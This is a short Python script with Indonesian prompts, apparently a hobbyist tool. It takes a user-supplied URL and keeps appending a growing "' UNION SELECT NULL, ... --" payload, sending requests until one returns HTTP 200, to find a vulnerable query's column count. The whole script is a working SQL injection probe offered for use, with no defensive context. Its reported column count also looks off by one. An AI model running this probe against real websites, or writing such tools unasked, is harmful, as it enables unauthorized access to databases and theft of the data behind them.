import requests
import pyfiglet

def kolomUnion():
    banner = pyfiglet.figlet_format("DETECTION")

    print(banner)
    print("PENDETEKSI JUMLAH KOLOM VIA URL\n")

    url = input('masukkan URL di sini: ')
    pembuka = "' UNION SELECT NULL"
    payload = ", NULL"
    tutup = " --"

    jumlahPayload = 0


    while True:
        union = url + pembuka + (payload * jumlahPayload) + tutup
        response = requests.get(union)
        jumlahPayload += 1

        code = response.status_code
        jumlahKolom = (jumlahPayload)

        panjang = len(response.text)

        print("=" * 150)

        print("URL: ", union)
        print("length: ", panjang)
        print('status: ', code)
        print('Jumlah kolom: ', jumlahKolom)

        print("=" * 150)

        if code == 200:
            break

kolomUnion()


